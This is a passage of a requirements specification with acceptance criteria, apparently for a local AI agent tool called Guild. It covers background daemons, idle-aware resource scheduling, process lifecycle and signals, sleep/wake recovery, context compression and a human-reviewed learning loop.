| REQ-23.3 | `guild attach <task_id>` reconnects to a running background task, streaming output in real-time | Reads from SQLite messages + notification channel (Unix socket or file-watch) |
| REQ-23.4 | `guild logs <task_id> [--follow]` streams agent output without interaction | Pure read-only log view. `--follow` tails new messages |
| REQ-23.5 | `guild ps` shows all running/paused/queued tasks with PIDs and elapsed time | Quick overview of what's happening |
| REQ-23.6 | Daemon process is a minimal supervisor: asyncio event loop, signal handling, crash recovery | Thin wrapper around existing `AgentLoop.run()` |
| REQ-23.7 | Multiple concurrent background tasks supported, subject to `max_concurrent_agents` config | Additional tasks queue; queue persisted in SQLite (survives reboot) |
| REQ-23.8 | Foreground mode (no `--background`) remains the default | No regression on interactive use |
| REQ-23.9 | Daemon uses a control socket (`.guild/run/guild.sock`) for control messages | Enables pause, resume, kill without PID signaling |

#### Acceptance Criteria (REQ-23.1 through REQ-23.9)

**REQ-23.1 — `guild task "description" --background` launches the agent in a detached daemon process**

- AC-23.1.1: Background flag spawns a detached process that outlives the launching terminal
  - verify: Run `guild task "hello" --background` -> CLI prints task ID and returns within 2 seconds; closing the terminal does not kill the agent process
- AC-23.1.2: CLI confirms launch with the assigned task ID
  - verify: Run `guild task "hello" --background` -> stdout includes a line like "Launched background task <task_id>"
- AC-23.1.3: Background launch fails gracefully when provider is unreachable
  - verify: Stop Ollama, run `guild task "hello" --background` -> CLI reports launch failure with a clear error message (not a stack trace)

**REQ-23.2 — Daemon writes PID to `.guild/run/<task_id>.pid` and state to SQLite**

- AC-23.2.1: PID file is created on daemon start and contains the correct process ID
  - verify: Launch a background task -> `.guild/run/<task_id>.pid` exists and `cat` returns a PID that matches the running daemon process
- AC-23.2.2: Task state is persisted in SQLite on every turn boundary
  - verify: Launch a background task, let it run 3+ turns -> query `tasks` table in SQLite -> status is `in-progress` and messages table has 3+ entries
- AC-23.2.3: PID file is removed on clean daemon exit
  - verify: Launch a background task, let it complete -> `.guild/run/<task_id>.pid` no longer exists

**REQ-23.3 — `guild attach <task_id>` reconnects to a running background task, streaming output in real-time**

- AC-23.3.1: Attach streams existing messages then live output
  - verify: Launch a background task, wait for 2+ messages, run `guild attach <task_id>` -> terminal shows all past messages followed by new messages as they arrive
- AC-23.3.2: Attach to a non-existent task ID returns a clear error
  - verify: Run `guild attach nonexistent-id` -> CLI prints "Task not found" (not a crash)
- AC-23.3.3: Detaching from an attached session does not stop the background task
  - verify: Attach to a running task, press Ctrl+C to detach -> the background daemon process continues running

**REQ-23.4 — `guild logs <task_id> [--follow]` streams agent output without interaction**

- AC-23.4.1: Logs without `--follow` prints all messages and exits
  - verify: Run `guild logs <task_id>` on a completed task -> prints all messages then returns to shell prompt
- AC-23.4.2: Logs with `--follow` tails new messages in real-time
  - verify: Run `guild logs <task_id> --follow` on a running task -> new messages appear within 1 second of being generated
- AC-23.4.3: `guild logs nonexistent-id` prints "No messages" or a clear error, does not crash
  - verify: Run `guild logs nonexistent-id` -> CLI prints "No messages found" or similar message with exit code 0 or 1 (not a stack trace)

**REQ-23.5 — `guild ps` shows all running/paused/queued tasks with PIDs and elapsed time**

- AC-23.5.1: `guild ps` lists active tasks with their status, PID, and elapsed time
  - verify: Launch two background tasks -> `guild ps` -> output table contains both task IDs, statuses (`running`), PIDs, and elapsed time columns
- AC-23.5.2: `guild ps` with no running tasks shows an empty result (not an error)
  - verify: With no tasks running, run `guild ps` -> output indicates no active tasks
- AC-23.5.3: `guild ps` shows tasks in `paused` and `queued` statuses alongside `running` tasks
  - verify: Launch a running task, pause another, queue a third -> `guild ps` lists all three with their correct status labels

**REQ-23.6 — Daemon process is a minimal supervisor: asyncio event loop, signal handling, crash recovery**

- AC-23.6.1: Daemon recovers from a transient tool failure without exiting
  - verify: Inject a tool that raises an exception on first call -> daemon retries or skips and continues the agent loop (does not crash)
- AC-23.6.2: Daemon handles SIGTERM gracefully
  - verify: Send SIGTERM to daemon PID -> daemon finishes current tool call, saves state, exits with code 0

**REQ-23.7 — Multiple concurrent background tasks supported, subject to `max_concurrent_agents` config**

- AC-23.7.1: Tasks exceeding `max_concurrent_agents` are queued
  - verify: Set `max_concurrent_agents = 1`, launch two background tasks -> first runs immediately, second shows status `queued` in `guild ps`
- AC-23.7.2: Queued tasks start automatically when a running task completes
  - verify: With `max_concurrent_agents = 1`, launch two tasks -> first completes -> second transitions from `queued` to `running` without manual intervention
- AC-23.7.3: Queue survives a reboot
  - verify: Queue a task, kill the Guild daemon, restart Guild -> queued task is still present in `guild ps`

**REQ-23.8 — Foreground mode (no `--background`) remains the default**

- AC-23.8.1: Running `guild task "hello"` without `--background` blocks the terminal and streams output inline
  - verify: Run `guild task "hello"` -> terminal is occupied until the task completes; output streams to stdout

**REQ-23.9 — Daemon uses a control socket (`.guild/run/guild.sock`) for control messages**

- AC-23.9.1: Control socket is created on daemon start
  - verify: Launch a background task -> `.guild/run/guild.sock` exists and is a Unix domain socket
- AC-23.9.2: Control commands (pause, resume, kill) are delivered via the socket
  - verify: Launch a background task, send a `pause` command over the socket -> daemon transitions task to `paused` state
- AC-23.9.3: Stale socket file from a crashed daemon does not prevent a new daemon from starting
  - verify: Create a stale `.guild/run/guild.sock` file, launch a background task -> daemon cleans up the stale socket and starts successfully

### REQ-24: Resource-Aware Scheduling ("Good Neighbor")

**Goal:** When the user is actively using their machine, Guild throttles or pauses inference. When idle, Guild runs at full speed.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-24.1 | Detect user activity state: `active` vs `idle` (no input for N minutes) | macOS: `CGEventSourceSecondsSinceLastEventType` or IOKit. Linux: `/proc/interrupts` delta or `xprintidle` |
| REQ-24.2 | Detect system load: CPU utilization, GPU utilization, memory pressure | macOS: `psutil`/`sysctl`. Linux: `/proc/stat`, `nvidia-smi` |
| REQ-24.3 | Three scheduling modes: `full` (no throttling), `polite` (yield on user activity), `stealth` (only run when idle) | Config: `[resource] mode = "polite"`. Default: `polite` |
| REQ-24.4 | `polite` mode: when user is active, delay between LLM calls (configurable backoff) | Reduces contention. Does NOT kill running inference — delays the NEXT one |
| REQ-24.5 | `stealth` mode: when user is active, pause all agent work. Resume after N minutes idle | For "run overnight" use cases |
| REQ-24.6 | GPU awareness: if VRAM is under pressure, Guild can unload the model or defer | Ollama-specific: `ollama ps` shows loaded models; can request unload |
| REQ-24.7 | Thermal awareness (macOS): if thermally throttled, reduce inference rate | Prevents fan spin-up during video calls |
| REQ-24.8 | `guild resource-status` shows current mode, system load, throttle state | Transparency — user understands why things are slow |
| REQ-24.9 | All thresholds configurable per-project and globally | `idle_timeout_minutes`, `cpu_threshold_percent`, `gpu_threshold_percent` |
| REQ-24.10 | Resource monitor runs as a lightweight thread in the daemon, polling every 5-10s | Minimal overhead |

#### Acceptance Criteria (REQ-24.1 through REQ-24.10)

**REQ-24.1 — Detect user activity state: `active` vs `idle` (no input for N minutes)**

- AC-24.1.1: User is detected as `active` when there has been recent keyboard or mouse input
  - verify: Move the mouse, query resource monitor -> activity state is `active`
- AC-24.1.2: User is detected as `idle` after the configured timeout with no input
  - verify: Set `idle_timeout_minutes = 1`, wait 90 seconds with no input -> activity state transitions to `idle`
- AC-24.1.3: Activity detection works on both macOS and Linux
  - verify: Run on macOS -> uses IOKit/CGEventSource. Run on Linux -> uses `/proc/interrupts` or `xprintidle`. Both report correct state

**REQ-24.2 — Detect system load: CPU utilization, GPU utilization, memory pressure**

- AC-24.2.1: CPU utilization is reported as a percentage
  - verify: Run `guild resource-status` -> output includes CPU utilization as a percentage (e.g., "CPU: 45%")
- AC-24.2.2: Memory pressure is detected
  - verify: Allocate memory until pressure is high -> resource monitor reports elevated memory usage
- AC-24.2.3: GPU utilization is reported when a GPU is present
  - verify: On a machine with a GPU running Ollama -> `guild resource-status` includes GPU utilization percentage
- AC-24.2.4: On a machine without a GPU, `guild resource-status` omits GPU fields gracefully (no error)
  - verify: Run `guild resource-status` on a machine with no GPU -> output omits GPU fields without error or "N/A" crash

**REQ-24.3 — Three scheduling modes: `full` (no throttling), `polite` (yield on user activity), `stealth` (only run when idle)**

- AC-24.3.1: Default mode is `polite`
  - verify: Fresh install with no `[resource]` section in config -> `guild resource-status` reports mode as `polite`
- AC-24.3.2: Mode is configurable via config file
  - verify: Set `resource.mode = "stealth"` in config -> `guild resource-status` reports mode as `stealth`
- AC-24.3.3: Invalid mode value is rejected at startup
  - verify: Set `resource.mode = "turbo"` -> startup fails with "Invalid scheduling mode 'turbo'; valid options: full, polite, stealth"

**REQ-24.4 — `polite` mode: when user is active, delay between LLM calls (configurable backoff)**

- AC-24.4.1: Active user triggers a delay before the next LLM call
  - verify: In `polite` mode with user active -> measure time between consecutive LLM calls -> delay matches configured backoff (e.g., 5 seconds)
- AC-24.4.2: Running inference is not interrupted
  - verify: Start an LLM call, then user becomes active -> the in-flight call completes; only the next call is delayed
- AC-24.4.3: Backoff duration is configurable
  - verify: Set `resource.polite_backoff_seconds = 10` -> delay between LLM calls during active user is ~10 seconds

**REQ-24.5 — `stealth` mode: when user is active, pause all agent work. Resume after N minutes idle**

- AC-24.5.1: Agent pauses when user becomes active
  - verify: Agent is running in `stealth` mode, user moves mouse -> agent loop pauses; no new LLM calls are made
- AC-24.5.2: Agent resumes after configured idle timeout
  - verify: Agent is paused in stealth mode, user stops activity, configured idle timeout passes -> agent resumes
- AC-24.5.3: Stealth pause is logged
  - verify: Stealth pause triggers -> log entry "Stealth mode: pausing agent work (user active)"

**REQ-24.6 — GPU awareness: if VRAM is under pressure, Guild can unload the model or defer**

- AC-24.6.1: VRAM pressure is detected via Ollama
  - verify: Load a large model consuming most VRAM -> resource monitor reports VRAM pressure
- AC-24.6.2: Guild defers new inference when VRAM is critical
  - verify: VRAM usage exceeds threshold -> next LLM call is deferred until VRAM drops below threshold
- AC-24.6.3: Model unload is requested when configured
  - verify: Set `resource.unload_on_vram_pressure = true` -> when VRAM exceeds threshold, Guild requests Ollama to unload the model

**REQ-24.7 — Thermal awareness (macOS): if thermally throttled, reduce inference rate**

- AC-24.7.1: Thermal throttling state is detected on macOS
  - verify: On macOS with thermal pressure -> `guild resource-status` shows thermal state (e.g., "Thermal: nominal" or "Thermal: critical")
- AC-24.7.2: Inference rate is reduced during thermal throttling
  - verify: Simulate thermal throttling -> delay between LLM calls increases; log entry "Thermal throttling detected; reducing inference rate"

**REQ-24.8 — `guild resource-status` shows current mode, system load, throttle state**

- AC-24.8.1: Output includes scheduling mode, CPU, memory, and throttle state
  - verify: Run `guild resource-status` -> output includes mode (e.g., "polite"), CPU %, memory %, user activity state, and current throttle status
- AC-24.8.2: Output includes GPU info when available
  - verify: On a GPU-equipped machine -> `guild resource-status` includes GPU utilization and VRAM usage

**REQ-24.9 — All thresholds configurable per-project and globally**

- AC-24.9.1: Project-level thresholds override global defaults
  - verify: Set global `cpu_threshold_percent = 80`, project-level `cpu_threshold_percent = 60` -> project uses 60%
- AC-24.9.2: Missing project-level thresholds fall back to global
  - verify: Set global `idle_timeout_minutes = 5`, no project-level override -> project uses 5 minutes

**REQ-24.10 — Resource monitor runs as a lightweight thread in the daemon, polling every 5-10s**

- AC-24.10.1: Monitor runs continuously in the background
  - verify: Launch a background task -> resource monitor thread is active; `guild resource-status` returns current data (not stale)
- AC-24.10.2: Monitor overhead is minimal
  - verify: Measure CPU usage of the Guild daemon with the resource monitor running -> monitor thread consumes less than 1% CPU
- AC-24.10.3: Poll interval is respected
  - verify: Log resource monitor poll timestamps -> consecutive polls are 5-10 seconds apart

### REQ-25: Process Lifecycle Management

**Goal:** Robust lifecycle — clean start, clean stop, crash recovery, external control.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-25.1 | `guild kill <task_id>` sends graceful shutdown to a running background task | Finish current tool call, save state, exit. Hard kill after 10s timeout |
| REQ-25.2 | `guild pause <task_id>` pauses a running task (no new turns start) | State persisted to SQLite. In-flight LLM call finishes but loop stops |
| REQ-25.3 | `guild resume <task_id>` resumes a paused task from last checkpoint | Reloads messages from SQLite, re-validates provider, continues loop |
| REQ-25.4 | Signal handling: SIGTERM/SIGINT → graceful shutdown, SIGUSR1 → checkpoint-and-continue | Standard Unix signal contract |
| REQ-25.5 | Crash recovery: detect orphaned PID files, offer `guild resume <task_id>` | Check if PID is alive. If not, mark task as `interrupted` |
| REQ-25.6 | State persisted on every turn boundary (not just graceful exit) | Already done via `storage.append_message()` per turn |
| REQ-25.7 | Stale lock detection: dead socket files are cleaned up automatically | Prevents "address already in use" after crashes |
| REQ-25.8 | `guild kill --all` stops all running Guild tasks in this project | Convenience for "stop everything now" |
| REQ-25.9 | Meaningful exit codes: 0=success, 1=task failed, 2=interrupted, 3=crash recovery available | Scriptable |

#### Acceptance Criteria (REQ-25.1 through REQ-25.9)

**REQ-25.1 — `guild kill <task_id>` sends graceful shutdown to a running background task**

- AC-25.1.1: Kill initiates graceful shutdown allowing the current tool call to finish
  - verify: Launch a background task running a 3-second shell command, immediately run `guild kill <task_id>` -> shell command completes, state is saved, daemon exits
- AC-25.1.2: Hard kill fires after the 10-second timeout if graceful shutdown stalls
  - verify: Launch a background task with a tool that hangs indefinitely, run `guild kill <task_id>` -> after 10 seconds, process is forcibly terminated
- AC-25.1.3: Kill on a non-existent task ID produces a clear error
  - verify: Run `guild kill nonexistent-id` -> error message "Task not found: nonexistent-id"

**REQ-25.2 — `guild pause <task_id>` pauses a running task (no new turns start)**

- AC-25.2.1: Pause stops the agent loop after the current turn completes
  - verify: Run `guild pause <task_id>` on a running task -> in-flight LLM call finishes, no new turn starts; `guild ps` shows status `paused`
- AC-25.2.2: Pause on an already-paused task is a no-op with a message
  - verify: Pause a task, then pause it again -> CLI prints "Task <task_id> is already paused"
- AC-25.2.3: State is persisted to SQLite when paused
  - verify: Pause a task -> query SQLite -> task status is `paused` and all messages up to the last completed turn are present

**REQ-25.3 — `guild resume <task_id>` resumes a paused task from last checkpoint**

- AC-25.3.1: Resume reloads messages from SQLite and continues the agent loop
  - verify: Pause a task at turn 5, run `guild resume <task_id>` -> agent continues from turn 6 with full message history
- AC-25.3.2: Resume re-validates the provider before continuing
  - verify: Pause a task, stop Ollama, run `guild resume <task_id>` -> error "Cannot resume: provider health check failed"
- AC-25.3.3: Resume on a task that is not paused produces a clear error
  - verify: Run `guild resume <task_id>` on a running task -> error "Task <task_id> is not paused; current status: running"

**REQ-25.4 — Signal handling: SIGTERM/SIGINT -> graceful shutdown, SIGUSR1 -> checkpoint-and-continue**

- AC-25.4.1: SIGTERM triggers graceful shutdown
  - verify: Send SIGTERM to the daemon -> daemon saves state and exits with code 0
- AC-25.4.2: SIGINT triggers graceful shutdown
  - verify: Send SIGINT to the daemon -> daemon saves state and exits with code 0
- AC-25.4.3: SIGUSR1 triggers checkpoint without stopping
  - verify: Send SIGUSR1 to the daemon -> a checkpoint is written to SQLite; agent continues running

**REQ-25.5 — Crash recovery: detect orphaned PID files, offer `guild resume <task_id>`**

- AC-25.5.1: Orphaned PID file is detected when the PID process is not alive
  - verify: Create a `.guild/run/<task_id>.pid` with a dead PID -> `guild ps` marks the task as `interrupted`
- AC-25.5.2: Recovery suggestion is offered for interrupted tasks
  - verify: `guild ps` shows an interrupted task -> output includes "Run `guild resume <task_id>` to recover"
- AC-25.5.3: Orphaned PID file is cleaned up on resume
  - verify: Resume an interrupted task -> the old PID file is removed and a new one is created with the new daemon PID
- AC-25.5.4: `guild ps` output for orphaned tasks includes the human-readable recovery suggestion
  - verify: Detect an orphaned PID file -> `guild ps` shows the task as `interrupted` with text "Run `guild resume <task_id>` to recover"

**REQ-25.6 — State persisted on every turn boundary (not just graceful exit)**

- AC-25.6.1: Messages are written to SQLite after each completed turn
  - verify: Kill the daemon with SIGKILL mid-task after 5 turns -> query SQLite -> all 5 completed turns are present
- AC-25.6.2: No data is lost for completed turns even on unexpected termination
  - verify: SIGKILL daemon at turn 10 -> resume task -> agent continues from turn 11 with turns 1-10 intact

**REQ-25.7 — Stale lock detection: dead socket files are cleaned up automatically**

- AC-25.7.1: Stale socket file is removed on daemon startup
  - verify: Create a stale `.guild/run/guild.sock`, start a new daemon -> stale socket is deleted and a new one is created
- AC-25.7.2: Active socket file is not removed
  - verify: With a running daemon, start a second daemon attempt -> second daemon detects the active socket and reports "Another Guild daemon is already running"

**REQ-25.8 — `guild kill --all` stops all running Guild tasks in this project**

- AC-25.8.1: All running tasks are stopped
  - verify: Launch 3 background tasks, run `guild kill --all` -> all 3 tasks are gracefully stopped; `guild ps` shows no running tasks
- AC-25.8.2: Paused tasks are also killed
  - verify: Pause one task, leave another running, run `guild kill --all` -> both are terminated

**REQ-25.9 — Meaningful exit codes: 0=success, 1=task failed, 2=interrupted, 3=crash recovery available**

- AC-25.9.1: Successful task exits with code 0
  - verify: Run a task that completes successfully in foreground -> shell `$?` is 0
- AC-25.9.2: Failed task exits with code 1
  - verify: Run a task that fails verification -> shell `$?` is 1
- AC-25.9.3: Interrupted task exits with code 2
  - verify: SIGINT a running foreground task -> shell `$?` is 2
- AC-25.9.4: Crash recovery available exits with code 3
  - verify: Detect an orphaned task on startup -> exit code is 3 (when running a status check script)

### REQ-26: Sleep/Wake Survival

**Goal:** Machine sleep does not corrupt agent state. Agent pauses cleanly on sleep, resumes on wake.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-26.1 | Detect system sleep and checkpoint before suspension | Time-drift detection (monotonic vs wall-clock) as MVP; OS notifications as enhancement |
| REQ-26.2 | On wake, detect sleep occurred and resume agent work | If `time.time() - last_turn_time >> expected`, sleep happened |
| REQ-26.3 | Ollama connection re-validated on wake (server may have died) | Health check before first post-wake inference. Retry with backoff |
| REQ-26.4 | In-flight LLM calls interrupted by sleep are retried, not treated as fatal | Network error from mid-stream interruption → retry the turn |
| REQ-26.5 | Sleep/wake events logged in audit trail | "why was agent stuck for 8 hours" → "machine slept 23:00–07:00" |
| REQ-26.6 | Configurable wake behavior: `resume` (default) or `stay-paused` | Some users want explicit `guild resume` after wake |

#### Acceptance Criteria (REQ-26.1 through REQ-26.6)

**REQ-26.1 — Detect system sleep and checkpoint before suspension**

- AC-26.1.1: Sleep is detected via time-drift between monotonic and wall-clock
  - verify: Simulate a 30-second gap between monotonic and wall-clock time -> sleep detector flags a sleep event
- AC-26.1.2: Checkpoint is saved before suspension completes
  - verify: Trigger a sleep event while agent is mid-task -> on wake, the last checkpoint in SQLite has a timestamp from before the sleep gap
- AC-26.1.3: Short pauses (under threshold) are not misidentified as sleep
  - verify: Introduce a 2-second delay between turns (below the default 30-second sleep threshold) -> no sleep event is detected

**REQ-26.2 — On wake, detect sleep occurred and resume agent work**

- AC-26.2.1: Agent resumes from last checkpoint after wake
  - verify: Agent is mid-task, machine sleeps and wakes -> agent continues from the last completed turn (not from the beginning)
- AC-26.2.2: Wake detection triggers within the first poll interval after resume
  - verify: Machine wakes -> within 10 seconds (one poll interval), the resource monitor detects the sleep gap and logs "Sleep detected: ~N hours"

**REQ-26.3 — Ollama connection re-validated on wake (server may have died)**

- AC-26.3.1: Health check runs before the first post-wake inference
  - verify: Machine sleeps, Ollama remains running -> on wake, logs show "Post-wake health check: provider reachable" before the next LLM call
- AC-26.3.2: Ollama restart during sleep is handled with retry
  - verify: Kill Ollama during sleep, restart it before wake -> on wake, health check fails once, retries with backoff, succeeds on retry, agent continues
- AC-26.3.3: Ollama still down on wake produces a clear error
  - verify: Kill Ollama during sleep, do not restart -> on wake, agent logs "Provider unreachable after wake; retries exhausted" and pauses the task

**REQ-26.4 — In-flight LLM calls interrupted by sleep are retried, not treated as fatal**

- AC-26.4.1: A network error from sleep interruption triggers a retry
  - verify: Agent is mid-streaming-response when sleep occurs -> on wake, the interrupted call is retried (not marked as a fatal error); agent loop continues
- AC-26.4.2: Retry uses the same prompt and message history as the interrupted call
  - verify: Inspect the retried LLM request after wake -> messages match the original pre-sleep request exactly

**REQ-26.5 — Sleep/wake events logged in audit trail**

- AC-26.5.1: Sleep and wake events appear in the audit log with timestamps
  - verify: Machine sleeps at 23:00 and wakes at 07:00 -> `guild audit` shows entries "System sleep detected at 23:00" and "System wake detected at 07:00"
- AC-26.5.2: Sleep duration is recorded
  - verify: After a sleep/wake cycle -> audit entry includes "Sleep duration: ~8h 0m"
- AC-26.5.3: Sleep duration is computed from the detected time-drift and included in the audit trail details
  - verify: Sleep drift of 28800 seconds detected -> audit wake entry details include "Sleep duration: ~8h 0m" (not just a generic "wake detected" message)

**REQ-26.6 — Configurable wake behavior: `resume` (default) or `stay-paused`**

- AC-26.6.1: Default behavior is auto-resume on wake
  - verify: With default config, machine sleeps and wakes -> agent resumes automatically without manual intervention
- AC-26.6.2: `stay-paused` mode requires manual resume
  - verify: Set `sleep.wake_behavior = "stay-paused"`, machine sleeps and wakes -> agent remains paused; `guild ps` shows status `paused (post-wake)`; `guild resume <task_id>` is required to continue
- AC-26.6.3: Wake behavior setting is respected per-task
  - verify: Task A has `wake_behavior = "resume"`, Task B has `wake_behavior = "stay-paused"` -> after wake, Task A resumes, Task B stays paused
- AC-26.6.4: Two concurrent tasks with different wake_behavior settings behave independently after a single wake event
  - verify: Task A (resume) and Task B (stay-paused) are both running when sleep occurs -> after wake, Task A auto-resumes while Task B remains paused

---

## P1 — Get the Agent to Run Better

### REQ-07: Context & Memory Management

**Goal:** Agents maintain useful context across sessions and share knowledge. Memory is indexed hints, not trusted truth.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-07.1 | Persistent conversation/task context across sessions | Stored on disk, survives restarts |
| REQ-07.2 | Checkpoint and resume for long-running tasks | Explicit checkpoints + auto-checkpoint on interval |
| REQ-07.3 | Shared knowledge base between team agents | Worker B can see what Worker A discovered |
| REQ-07.4 | **Multi-tier context compression** — local trim → model-based summarization → full compact with re-injection | MicroCompact (zero API calls) → AutoCompact → Full Compact |
| REQ-07.5 | **Skeptical memory** — agent verifies memories against actual state before acting | Memory entries are hints, not trusted facts |
| REQ-07.6 | Lightweight memory index always loaded, detailed notes fetched on demand | Index <200 lines |
| REQ-07.7 | Memory consolidation during idle time | Merge observations, remove contradictions |
| REQ-07.8 | **Context resets with structured handoff** for very long tasks | Clear context + handoff artifact |
| REQ-07.9 | Task history — browse and search past tasks and their outcomes | Queryable from CLI |
| REQ-07.10 | **Static/dynamic prompt separation** for cache efficiency | Static instructions cacheable, dynamic content separate |

#### Acceptance Criteria (REQ-07.1 through REQ-07.10)

**REQ-07.1 — Persistent conversation/task context across sessions**

- AC-07.1.1: Conversation history is stored to disk after every turn
  - verify: Run a task with 3 turns, restart Guild, query messages for that task -> all 3 turns are present in storage
- AC-07.1.2: Resuming a task restores the full message history
  - verify: Pause a task at turn 5, resume it -> agent's context contains all 5 previous turns

**REQ-07.2 — Checkpoint and resume for long-running tasks**

- AC-07.2.1: Explicit checkpoint is created via `guild checkpoint <task_id>`
  - verify: Run `guild checkpoint <task_id>` mid-task -> checkpoint entry created with turn number and timestamp
- AC-07.2.2: Auto-checkpoint fires at the configured interval
  - verify: Set `checkpoint.interval_minutes = 5` -> after 5 minutes of work, a checkpoint is created automatically without user action
- AC-07.2.3: Resume from checkpoint skips already-completed work
  - verify: Checkpoint at turn 10, crash at turn 12, resume -> agent resumes from turn 10 (not turn 0 or turn 12)

**REQ-07.3 — Shared knowledge base between team agents**

- AC-07.3.1: Data written to SharedContext by one agent is readable by another agent
  - verify: Agent A calls `shared.put("style", {"indent": 4})`, Agent B calls `shared.get("style")` -> returns `{"indent": 4}`
- AC-07.3.2: Learnings stored by one agent's task are available to other agents
  - verify: Agent A's task produces learning "always validate inputs" with confidence 0.7 -> Agent B queries learnings with `min_confidence=0.5` -> the learning is included
- AC-07.3.3: SharedContext tracks which agent contributed each entry
  - verify: Agent A writes key "k1", Agent B writes key "k2" -> `list_keys()` returns both; metadata identifies the contributing agent

**REQ-07.4 — Multi-tier context compression**

- AC-07.4.1: MicroCompact trims context without any API calls
  - verify: Context exceeds 80% of window -> MicroCompact removes old tool results and system messages locally, with zero LLM calls
- AC-07.4.2: AutoCompact uses the model to summarize when MicroCompact is insufficient
  - verify: Context still too large after MicroCompact -> AutoCompact calls the LLM to produce a condensed summary of older turns
- AC-07.4.3: Critical state survives all compression tiers
  - verify: Run full compact on a 100-turn conversation -> the original task description and the last 5 turns remain intact in the compressed context
- AC-07.4.4: The task description (user's original request) survives all compression tiers
  - verify: Run a 100-turn conversation, trigger full compact -> the user's original task description from turn 1 remains intact in the compressed context (not just the system prompt)

**REQ-07.5 — Skeptical memory: agent verifies memories against actual state before acting**

- AC-07.5.1: Agent checks a memory against current state before relying on it
  - verify: Memory says "config.toml has [provider] section", but config.toml was changed -> agent reads the file to verify before using the memory
- AC-07.5.2: Stale memories are flagged when verification fails
  - verify: Memory contradicts actual state -> memory is marked as stale with a "verification failed" annotation

**REQ-07.6 — Lightweight memory index always loaded, detailed notes fetched on demand**

- AC-07.6.1: Memory index is under 200 lines
  - verify: Inspect the loaded memory index after 50 tasks -> index is fewer than 200 lines of text
- AC-07.6.2: Detailed notes are fetched only when the agent requests them
  - verify: Agent receives the index, asks for details on entry X -> detailed note for X is loaded from storage on demand

**REQ-07.7 — Memory consolidation during idle time**

- AC-07.7.1: Consolidation removes entries unverified for longer than the configured retention period
  - verify: Memory entry created 35 days ago with no verification -> `consolidate()` removes it; a fresh entry remains
- AC-07.7.2: Consolidation merges duplicate memory entries (same summary)
  - verify: Two memory entries with identical summaries exist -> after `consolidate()`, only one remains
- AC-07.7.3: Consolidation runs automatically during idle periods
  - verify: Agent is idle for the configured consolidation interval -> consolidation runs without manual invocation; `guild learnings` reflects the cleaned state
- AC-07.7.4: Consolidation returns a count of changes made
  - verify: 2 stale entries removed and 1 duplicate merged -> `consolidate()` returns >= 3

**REQ-07.8 — Context resets with structured handoff for very long tasks**

- AC-07.8.1: Context reset creates a handoff artifact summarizing completed work
  - verify: Trigger a context reset at turn 200 -> handoff artifact contains sections "Completed", "In Progress", "Remaining", and "Key Decisions"
- AC-07.8.2: The new agent session starts with the handoff artifact, not raw history
  - verify: After context reset, the new session's initial context contains the handoff artifact, not the 200-turn raw conversation

**REQ-07.9 — Task history: browse and search past tasks**

- AC-07.9.1: `guild history` lists past tasks with status and timestamps
  - verify: Complete 3 tasks, run `guild history` -> output shows all 3 with description, status (done/failed), and start/end times
- AC-07.9.2: `guild history --search "database"` filters by keyword
  - verify: Complete tasks "setup database" and "fix CLI" -> `guild history --search "database"` returns only the database task

**REQ-07.10 — Static/dynamic prompt separation for cache efficiency**

- AC-07.10.1: Static prompt content is separated from dynamic content in the LLM request
  - verify: Inspect the messages sent to the LLM -> system instructions are in a stable prefix block; dynamic content follows separately
- AC-07.10.2: Static content remains identical across turns for cache hits
  - verify: Compare the static prefix of turn 1 and turn 10 -> byte-identical, enabling provider-level prompt caching

### REQ-09: Long-Term Learning Loop

**Goal:** Guild gets smarter over time. Completed tasks are opportunities to extract knowledge.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-09.1 | **Post-task learning extraction** — learner reviews what happened after each task | What worked, failed, was slow, patterns emerged |
| REQ-09.2 | **Knowledge categories**: patterns, anti-patterns, tool tips, domain knowledge | Structured, not free-text dump |
| REQ-09.3 | **Confidence scoring** — learnings start tentative, get promoted after repeated validation | Prevents one-off flukes from becoming "knowledge" |
| REQ-09.4 | **Learning injection** — confirmed learnings available to agents in future sessions | Injected as hints |
| REQ-09.5 | **Learning review** — human can browse, edit, approve, or reject learnings | CLI; human stays in control |
| REQ-09.6 | **Cross-task learning** — patterns from task A inform task B | "Last time we did X, it worked well" |
| REQ-09.7 | **Block-level learning** — learnings scoped to specific blocks | "When using dev-loop, always lint first" |
| REQ-09.8 | **Learning decay** — old unvalidated learnings lose confidence | Prevents stale knowledge |
| REQ-09.9 | **Prompt refinement suggestions** — learner suggests improvements based on patterns | "The reviewer misses type errors — suggest adding X to prompt" |

#### Acceptance Criteria (REQ-09.1 through REQ-09.9)

**REQ-09.1 — Post-task learning extraction**

- AC-09.1.1: After a task completes, the learner reviews the task log and extracts learnings
  - verify: Complete a task -> `guild learnings --task <id>` shows at least one extracted learning with source "post-task extraction"
- AC-09.1.2: Extraction runs automatically without user intervention
  - verify: Complete a task at Tier 3 -> learning extraction happens without any prompt or approval step

**REQ-09.2 — Knowledge categories: patterns, anti-patterns, tool tips, domain knowledge**

- AC-09.2.1: Each learning is assigned a category from the defined set
  - verify: Extract a learning -> it has a `category` field set to one of: `pattern`, `anti-pattern`, `tool-tip`, `domain-knowledge`
- AC-09.2.2: `guild learnings --category pattern` filters by category
  - verify: Store learnings across multiple categories -> filter returns only those matching the requested category

**REQ-09.3 — Confidence scoring: learnings start tentative, get promoted after repeated validation**

- AC-09.3.1: New learnings start with a low confidence score
  - verify: Extract a new learning -> confidence is set to the initial value (e.g., 0.3), not 1.0
- AC-09.3.2: Confidence increases when the learning is validated by a subsequent task
  - verify: Learning "always run lint before tests" is validated by 3 tasks -> confidence rises from 0.3 to a higher value (e.g., 0.7)
- AC-09.3.3: A learning that is contradicted by a task outcome has its confidence reduced
  - verify: Learning "module X has no dependencies" is contradicted -> confidence decreases

**REQ-09.4 — Learning injection: confirmed learnings available to agents in future sessions**

- AC-09.4.1: Learnings above the confidence threshold are included in the agent's context
  - verify: Learning with confidence 0.8 (above threshold 0.5) -> appears in the agent's context for relevant tasks
- AC-09.4.2: Learnings below the threshold are not injected
  - verify: Learning with confidence 0.2 (below threshold 0.5) -> does not appear in the agent's context

**REQ-09.5 — Learning review: human can browse, edit, approve, or reject learnings**

- AC-09.5.1: `guild learnings` lists all learnings with their confidence and category
  - verify: Run `guild learnings` -> output shows each learning with text, category, confidence score, and creation date
- AC-09.5.2: `guild learnings approve <id>` promotes a learning to maximum confidence
  - verify: Approve a learning -> its confidence is set to 1.0
